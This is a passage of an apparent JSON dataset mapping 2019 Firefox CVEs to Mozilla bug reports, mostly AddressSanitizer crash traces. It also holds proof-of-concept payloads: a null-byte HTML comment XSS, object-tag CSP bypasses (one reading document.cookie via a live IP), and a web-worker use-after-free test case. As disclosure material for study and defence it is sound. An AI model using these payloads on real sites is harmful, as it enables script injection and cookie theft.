        "description": "This bug is for crash report bp-ee4cf772-6446-4451-86a1-253e90190315. Top 7 frames of crashing thread: 0 xul.dll static bool nsTArray_Impl< xpcom/ds/nsTArray.h:1778 1 xul.dll mozilla::a11y::DocAccessibleParent::RecvHideEvent accessible/ipc/DocAccessibleParent.cpp:184 2 xul.dll mozilla::a11y::PDocAccessibleParent::OnMessageReceived ipc/ipdl/PDocAccessibleParent.cpp:287 3 xul.dll void mozilla::ipc::MessageChannel::DispatchMessage ipc/glue/MessageChannel.cpp:2078 4 xul.dll nsresult mozilla::ipc::MessageChannel::MessageTask::Run ipc/glue/MessageChannel.cpp:1968 5 xul.dll nsThread::ProcessNextEvent xpcom/threads/nsThread.cpp:1179 6 xul.dll XPTC__InvokebyIndex these crashes are starting to show up since firefox 63 on 64bit versions of windows - in rather low volume though. most of the affected builds and comments are in chinese. a portion of crashes are looking like wild-pointer issues."
      }
    ],
    "CVE-2019-11760": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1577719",
        "title": "stack-buffer-overflow in nr_reg_register_callback",
        "description": "This crash was found while dom fuzzing, however the testcase does not reproduce. It looks like the nr_reg_assoc_destroy method is used incorrectly here: https://searchfox.org/mozilla-central/source/media/mtransport/third_party/nrappkit/src/registry/registrycb.c#185 ================================================================= ==1654==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fed29ec5e10 at pc 0x7fed4011894e bp 0x7fed29ec5d50 sp 0x7fed29ec5d48 READ of size 8 at 0x7fed29ec5e10 thread T5 (IPDL Background) #0 0x7fed4011894d in r_assoc_destroy /builds/worker/workspace/build/src/media/mtransport/third_party/nrappkit/src/util/libekr/r_assoc.c #1 0x7fed40117d36 in nr_reg_assoc_destroy /builds/worker/workspace/build/src/media/mtransport/third_party/nrappkit/src/registry/registrycb.c:271:10 #2 0x7fed40117d36 in nr_reg_register_callback /builds/worker/workspace/build/src/media/mtransport/third_party/nrappkit/src/registry/registrycb.c:185 #3 0x7fed4011a477 in NR_reg_register_callback /builds/worker/workspace/build/src/media/mtransport/third_party/nrappkit/src/registry/registrycb.c:404:20 #4 0x7fed4011a477 in r_log_get_destinations /builds/worker/workspace/build/src/media/mtransport/third_party/nrappkit/src/log/r_log.c:571 #5 0x7fed40113826 in _r_log_init /builds/worker/workspace/build/src/media/mtransport/third_party/nrappkit/src/log/r_log.c:646:9 #6 0x7fed40113826 in r_log_init /builds/worker/workspace/build/src/media/mtransport/third_party/nrappkit/src/log/r_log.c:622 #7 0x7fed4011501d in NR_reg_init /builds/worker/workspace/build/src/media/mtransport/third_party/nrappkit/src/registry/registry.c:105:6 #8 0x7fed3566c25a in mozilla::RLogConnector::CreateInstance() /builds/worker/workspace/build/src/media/mtransport/rlogconnector.cpp:106:5 #9 0x7fed35340465 in mozilla::MediaTransportHandlerSTS::EnterPrivateMode() /builds/worker/workspace/build/src/media/webrtc/signaling/src/peerconnection/MediaTransportHandler.cpp:1090:3 #10 0x7fed3535c55a in mozilla::MediaTransportParent::RecvEnterPrivateMode() /builds/worker/workspace/build/src/media/webrtc/signaling/src/peerconnection/MediaTransportParent.cpp:118:20 #11 0x7fed346a2c45 in mozilla::dom::PMediaTransportParent::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PMediaTransportParent.cpp:435:64 #12 0x7fed34d29ca0 in mozilla::ipc::PBackgroundParent::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundParent.cpp:3588:32 #13 0x7fed33ec0a86 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(mozilla::ipc::ActorLifecycleProxy*, IPC::Message const&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2184:25 #14 0x7fed33ebb7eb in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2108:9 #15 0x7fed33ebdda7 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1955:3 #16 0x7fed33ebec37 in mozilla::ipc::MessageChannel::MessageTask::Run() /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1986:13 #17 0x7fed32cd7800 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1225:14 #18 0x7fed32cdd628 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10 #19 0x7fed33ecb842 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:303:20 #20 0x7fed33dc5632 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #21 0x7fed33dc5632 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #22 0x7fed33dc5632 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #23 0x7fed32cd114a in nsThread::ThreadFunc(void*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:458:11 #24 0x7fed55d870bd in _pt_root /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:198:5 #25 0x7fed559cb6da in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76da) #26 0x7fed549a988e in clone (/lib/x86_64-linux-gnu/libc.so.6+0x12188e) Address 0x7fed29ec5e10 is located in stack of thread T5 (IPDL Background) at offset 80 in frame #0 0x7fed40117acf in nr_reg_register_callback /builds/worker/workspace/build/src/media/mtransport/third_party/nrappkit/src/registry/registrycb.c:119 This frame has 3 object(s): [32, 40) 'ptr.addr.i' (line 271) [64, 72) 'assoc' (line 121) <== Memory access at offset 80 overflows this variable [96, 105) 'cb_id' (line 125) <== Memory access at offset 80 underflows this variable HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork (longjmp and C++ exceptions are supported) Thread T5 (IPDL Background) created by T0 (Socket Process) here: #0 0x55a35f8d829d in __interceptor_pthread_create /builds/worker/fetches/llvm-project/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:210:3 #1 0x7fed55d791b8 in _PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:430:14 #2 0x7fed55d62d9e in PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:503:12 #3 0x7fed32cd3639 in nsThread::Init(nsTSubstring<char> const&) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:672:8 #4 0x7fed32cdc770 in nsThreadManager::NewNamedThread(nsTSubstring<char> const&, unsigned int, nsIThread**) /builds/worker/workspace/build/src/xpcom/threads/nsThreadManager.cpp:415:12 #5 0x7fed32ce028a in NS_NewNamedThread(nsTSubstring<char> const&, nsIThread**, nsIRunnable*, unsigned int) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:139:57 #6 0x7fed33e70282 in NS_NewNamedThread<16> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:71:10 #7 0x7fed33e70282 in (anonymous namespace)::ParentImpl::CreateBackgroundThread() /builds/worker/workspace/build/src/ipc/glue/BackgroundImpl.cpp:944 #8 0x7fed33e27fe4 in Alloc /builds/worker/workspace/build/src/ipc/glue/BackgroundImpl.cpp:818:30 #9 0x7fed33e27fe4 in mozilla::ipc::BackgroundParent::Alloc(mozilla::dom::ContentParent*, mozilla::ipc::Endpoint<mozilla::ipc::PBackgroundParent>&&) /builds/worker/workspace/build/src/ipc/glue/BackgroundImpl.cpp:640 #10 0x7fed33bf7d87 in mozilla::net::SocketProcessBridgeParent::RecvInitBackground(mozilla::ipc::Endpoint<mozilla::ipc::PBackgroundParent>&&) /builds/worker/workspace/build/src/netwerk/ipc/SocketProcessBridgeParent.cpp:41:8 #11 0x7fed349eb43d in mozilla::net::PSocketProcessBridgeParent::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PSocketProcessBridgeParent.cpp:130:69 #12 0x7fed33ec0a86 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(mozilla::ipc::ActorLifecycleProxy*, IPC::Message const&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2184:25 #13 0x7fed33ebb7eb in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2108:9 #14 0x7fed33ebdda7 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1955:3 #15 0x7fed33ebec37 in mozilla::ipc::MessageChannel::MessageTask::Run() /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1986:13 #16 0x7fed32cd7800 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1225:14 #17 0x7fed32cdd628 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10 #18 0x7fed33ec9e64 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:110:5 #19 0x7fed33dc5632 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #20 0x7fed33dc5632 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #21 0x7fed33dc5632 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #22 0x7fed3c0a9149 in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:137:27 #23 0x7fed3ff96acf in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:934:20 #24 0x7fed33dc5632 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #25 0x7fed33dc5632 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #26 0x7fed33dc5632 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #27 0x7fed3ff96376 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:769:34 #28 0x55a35f922d73 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:56:28 #29 0x55a35f922d73 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:267 #30 0x7fed548a9b96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96) SUMMARY: AddressSanitizer: stack-buffer-overflow /builds/worker/workspace/build/src/media/mtransport/third_party/nrappkit/src/util/libekr/r_assoc.c in r_assoc_destroy Shadow bytes around the buggy address: 0x0ffe253d0b70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0ffe253d0b80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0ffe253d0b90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0ffe253d0ba0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0ffe253d0bb0: 00 00 00 00 00 00 00 00 f1 f1 f1 f1 00 f2 f2 f2 =>0x0ffe253d0bc0: 00 f2[f2]f2 00 01 f3 f3 00 00 00 00 00 00 00 00 0x0ffe253d0bd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0ffe253d0be0: f1 f1 f1 f1 00 00 00 00 00 00 00 00 00 00 00 00 0x0ffe253d0bf0: 00 00 00 00 f2 f2 f2 f2 04 f2 01 f3 00 00 00 00 0x0ffe253d0c00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0ffe253d0c10: f1 f1 f1 f1 04 f3 f3 f3 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc ==1654==ABORTING"
      }
    ],
    "CVE-2019-11763": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1584216",
        "title": "Handle zero bytes after <!- and & correctly",
        "description": "This just got dropped in a conference: <!-[x00][x00][x00][x00][x00]- ><div title=\"--><img src=1 onerror=alert(1)>\"></div>"
      }
    ],
    "CVE-2019-11764": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1558522%2C1577061%2C1548044%2C1571223%2C1573048%2C1578933%2C1575217%2C1583684%2C1586845%2C1581950%2C1583463%2C1586599",
        "description": "This just got dropped in a conference: <!-[x00][x00][x00][x00][x00]- ><div title=\"--><img src=1 onerror=alert(1)>\"></div>"
      }
    ],
    "CVE-2019-17000": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1441468",
        "title": "csp bypass using object tag",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36 Steps to reproduce: visit this POC.html: === <html> <meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self';script-src 'none';object-src data:;img-src 'none';frame-src data:\"/> <!-- CSP is set and both script-src and img-src is 'none' --> <body> <!-- inline script will run and remote image load --> <object data='data:text/html;,<svg version=\"1.1\" width=\"660\" height=\"342\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><script>console.log(\"Remote Image test\")</script><image xlink:href=\"https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/img/logo/bd_logo1_31bdc765.png?x\" width=\"660\" height=\"342\"/></svg>'></object> <!-- CSP works fine --> <iframe src='data:text/html;,<script>console.log(\"Remote Image test\")</script><img src=\"https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/img/logo/bd_logo1_31bdc765.png?x\" width=\"660\" height=\"342\"/>'></iframe> </body> </html> === Actual results: in object tag , inline script runs and remote image loads , but in iframe tag ,CSP works fine Expected results: Ref: https://www.w3.org/TR/CSP3/#directive-img-src \"This directive controls requests which load images. More formally, this includes requests whose type is \"image\" [FETCH].\" Ref: https://www.w3.org/TR/CSP3/#directive-script-src \"The script-src directive restricts the locations from which scripts may be executed. This includes not only URLs loaded directly into script elements, but also things like inline script blocks and XSLT stylesheets [XSLT] which can trigger script execution.\" object tag should behaves like iframe"
      }
    ],
    "CVE-2019-17001": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1587976",
        "title": "CSP script-src 'none'; allows <object> to execute javascript code in firefox (but firefox developer edition works fines)",
        "description": "The Mozilla developer docs say that: \"The HTTP Content-Security-Policy (CSP) script-src directive specifies valid sources for JavaScript. This includes not only URLs loaded directly into <script> elements, but also things like inline script event handlers (onclick) and XSLT stylesheets which can trigger script execution.\" and: \"'none' Refers to the empty set; that is, no URLs match. The single quotes are required.\", according to https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src These days while I was playing a CTF, I was able to trigger arbitrary javascript in the page's context using the <object> tag and could even steal user cookies. This wasn't the CTF expected solution and shouldn't have worked because of the script-src 'none' policy ( doesn't work on chrome and other browsers). So I made a PoC page and the working payload is: http://38.240.18.75/csp/index.php?payload=<object data=\"javascript:alert(${document.cookie})\"></object> Code like: http://38.240.18.75/csp/index.php?payload=<object data=\"data:text/html,<script>alert(document.cookie)</script>\"></object> executes in a different context and doesn't affect the web page, but maybe should be blocked as well by the CSP policy. In the attachments I'm disposing the webpage source and some prints of a working PoC."
      }
    ],
    "CVE-2019-17002": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1561056",
        "title": "No upgrade-insecure-requests for dragged links",
        "description": "STR: Visit http://wopr.norad.org/test1.html Drag the link onto a tab or into a new tab Expected: Link is upgraded to https Actual: Link remains http Tested on Firefox nightly 69 Linux, ASAN build"
      }
    ],
    "CVE-2019-17008": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1546331",
        "title": "Web Workers - Use After Free in RegisterDebuggerMainThread()",
        "description": "Prove of Concept test case (full server code in attached file UAF_RegisterDebuggerMainThread_PoC.js): Main Page code: <script type=\"text/javascript\"> gc = function() { for (var i = 0; i < 0x20000; ++i) var s = new String('AAAA'); }; worker0 = new Worker(\"worker0.js\"); worker0.onerror=function(){ gc();}; worker1 = new Worker(\"worker1.js\"); setTimeout(function(){location.reload()},200); </script> Worker 0: var embedworker1 = new Worker(\"embedworker1.js\"); yes = no; Worker 1: self.onerror = function () { embedworker0.terminate(); }; var embedworker0 = new Worker(\"embedworker0.js\"); yes = no; Steps to reproduce: 1. Run server side script UAF_RegisterDebuggerMainThread_PoC.js with Node.js (node UAF_RegisterDebuggerMainThread_PoC.js). 2. Enter http://localhost:12345 in Firefox ASAN build. 3. ASAN reports a Use After Free in RegisterDebuggerMainThread(): ==3247==ERROR: AddressSanitizer: heap-use-after-free on address 0x61b00017b210 at pc 0x7fe791ea90ce bp 0x7ffe59b72f10 sp 0x7ffe59b72f08 WRITE of size 8 at 0x61b00017b210 thread T0 (Web Content) #0 0x7fe791ea90cd in SetDebugger /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.h:188:15 #1 0x7fe791ea90cd in mozilla::dom::WorkerDebuggerManager::RegisterDebuggerMainThread(mozilla::dom::WorkerPrivate*, bool) Firefox version: 68.0a1 (2019-04-22) (64-bit) OS: Ubuntu 16.04 LTS Stack trace: ================================================================= ==3247==ERROR: AddressSanitizer: heap-use-after-free on address 0x61b00017b210 at pc 0x7fe791ea90ce bp 0x7ffe59b72f10 sp 0x7ffe59b72f08 WRITE of size 8 at 0x61b00017b210 thread T0 (Web Content) #0 0x7fe791ea90cd in SetDebugger /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.h:188:15 #1 0x7fe791ea90cd in mozilla::dom::WorkerDebuggerManager::RegisterDebuggerMainThread(mozilla::dom::WorkerPrivate*, bool) /builds/worker/workspace/build/src/dom/workers/WorkerDebuggerManager.cpp:277 #2 0x7fe791ed28de in mozilla::dom::(anonymous namespace)::RegisterDebuggerMainThreadRunnable::Run() /builds/worker/workspace/build/src/dom/workers/WorkerDebuggerManager.cpp:41:14 #3 0x7fe78a2b22c1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14 #4 0x7fe78a2b83d8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10 #5 0x7fe78b2f7caa in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:88:21 #6 0x7fe78b227fd2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #7 0x7fe78b227fd2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #8 0x7fe78b227fd2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #9 0x7fe7926bf749 in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:137:27 #10 0x7fe7962dd4df in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:919:20 #11 0x7fe78b227fd2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #12 0x7fe78b227fd2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #13 0x7fe78b227fd2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #14 0x7fe7962dce86 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:757:34 #15 0x5604aa4e53a7 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:56:28 #16 0x5604aa4e53a7 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:263 #17 0x7fe7a9c4282f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291 #18 0x5604aa406af8 in _start (/home/thecoder/FirefoxBuilds/firefox/firefox+0x2aaf8) 0x61b00017b210 is located 912 bytes inside of 1440-byte region [0x61b00017ae80,0x61b00017b420) freed by thread T22 (DOM Worker) here: #0 0x5604aa4b2182 in free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:124:3 #1 0x7fe791f1e110 in operator delete /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:151:10 #2 0x7fe791f1e110 in Release /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.h:102 #3 0x7fe791f1e110 in Release /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:46 #4 0x7fe791f1e110 in Release /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:363 #5 0x7fe791f1e110 in assign_assuming_AddRef /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:65 #6 0x7fe791f1e110 in operator= /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:156 #7 0x7fe791f1e110 in ClearSelfAndParentEventTargetRef /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.h:125 #8 0x7fe791f1e110 in mozilla::dom::(anonymous namespace)::WorkerFinishedRunnable::WorkerRun(JSContext*, mozilla::dom::WorkerPrivate*) /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:238 #9 0x7fe791f09842 in mozilla::dom::WorkerRunnable::Run() /builds/worker/workspace/build/src/dom/workers/WorkerRunnable.cpp:363:12 #10 0x7fe791eef44c in ProcessAllControlRunnablesLocked /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:3276:9 #11 0x7fe791eef44c in mozilla::dom::WorkerPrivate::DoRunLoop(JSContext*) /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:2646 #12 0x7fe791eb82cb in mozilla::dom::workerinternals::(anonymous namespace)::WorkerThreadPrimaryRunnable::Run() /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:2305:40 #13 0x7fe78a2b22c1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14 #14 0x7fe78a2b83d8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10 #15 0x7fe78b2f8eb0 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:333:5 #16 0x7fe78b227fd2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #17 0x7fe78b227fd2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #18 0x7fe78b227fd2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #19 0x7fe78a2ac21a in nsThread::ThreadFunc(void*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:454:11 #20 0x7fe7ab05905d in _pt_root /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:201:5 #21 0x7fe7aaca06b9 in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76b9) previously allocated by thread T22 (DOM Worker) here: #0 0x5604aa4b2503 in __interceptor_malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:146:3 #1 0x5604aa4e6f9d in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:68:15 #2 0x7fe791ee9c29 in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:131:10 #3 0x7fe791ee9c29 in mozilla::dom::WorkerPrivate::Constructor(JSContext*, nsTSubstring<char16_t> const&, bool, mozilla::dom::WorkerType, nsTSubstring<char16_t> const&, nsTSubstring<char> const&, mozilla::dom::WorkerLoadInfo*, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:2235 #4 0x7fe791e9ba17 in mozilla::dom::Worker::Constructor(mozilla::dom::GlobalObject const&, nsTSubstring<char16_t> const&, mozilla::dom::WorkerOptions const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/workers/Worker.cpp:30:41 #5 0x7fe78f4ae630 in mozilla::dom::Worker_Binding::_constructor(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/WorkerBinding.cpp:1112:52 #6 0x7fe796569595 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:442:13 #7 0x7fe796569595 in CallJSNativeConstructor /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:458 #8 0x7fe796569595 in InternalConstruct(JSContext*, js::AnyConstructArgs const&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:651 #9 0x7fe796546916 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3070:16 #10 0x7fe796530528 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:422:10 #11 0x7fe79656bb7c in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:781:13 #12 0x7fe79656c329 in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:814:10 #13 0x7fe7967ed334 in bool Evaluate<char16_t>(JSContext*, js::ScopeKind, JS::Handle<JSObject*>, JS::ReadOnlyCompileOptions const&, JS::SourceText<char16_t>&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/CompilationAndEvaluation.cpp:539:10 #14 0x7fe7967ec6aa in JS::Evaluate(JSContext*, JS::ReadOnlyCompileOptions const&, JS::SourceText<char16_t>&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/CompilationAndEvaluation.cpp:557:10 #15 0x7fe791ec98d6 in mozilla::dom::(anonymous namespace)::ScriptExecutorRunnable::WorkerRun(JSContext*, mozilla::dom::WorkerPrivate*) /builds/worker/workspace/build/src/dom/workers/ScriptLoader.cpp:1989:10 #16 0x7fe791f09842 in mozilla::dom::WorkerRunnable::Run() /builds/worker/workspace/build/src/dom/workers/WorkerRunnable.cpp:363:12 #17 0x7fe78a2b22c1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14 #18 0x7fe78a2b83d8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10 #19 0x7fe791ef859e in mozilla::dom::WorkerPrivate::RunCurrentSyncLoop() /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:3646:7 #20 0x7fe791e9a7b5 in Run /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.h:1173:27 #21 0x7fe791e9a7b5 in mozilla::dom::(anonymous namespace)::LoadAllScripts(mozilla::dom::WorkerPrivate*, nsTArray<mozilla::dom::(anonymous namespace)::ScriptLoadInfo>&, bool, mozilla::dom::WorkerScriptType, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/workers/ScriptLoader.cpp:2149 #22 0x7fe791e99bd2 in mozilla::dom::workerinternals::LoadMainScript(mozilla::dom::WorkerPrivate*, nsTSubstring<char16_t> const&, mozilla::dom::WorkerScriptType, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/workers/ScriptLoader.cpp:2259:3 #23 0x7fe791f1ca85 in mozilla::dom::(anonymous namespace)::CompileScriptRunnable::WorkerRun(JSContext*, mozilla::dom::WorkerPrivate*) /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:340:5 #24 0x7fe791f09842 in mozilla::dom::WorkerRunnable::Run() /builds/worker/workspace/build/src/dom/workers/WorkerRunnable.cpp:363:12 #25 0x7fe78a2b22c1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14 #26 0x7fe78a2b83d8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10 #27 0x7fe791eefd3a in mozilla::dom::WorkerPrivate::DoRunLoop(JSContext*) /builds/worker/workspace/build/src/dom/workers/WorkerPrivate.cpp:2748:7 #28 0x7fe791eb82cb in mozilla::dom::workerinternals::(anonymous namespace)::WorkerThreadPrimaryRunnable::Run() /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:2305:40 #29 0x7fe78a2b22c1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14 #30 0x7fe78a2b83d8 in 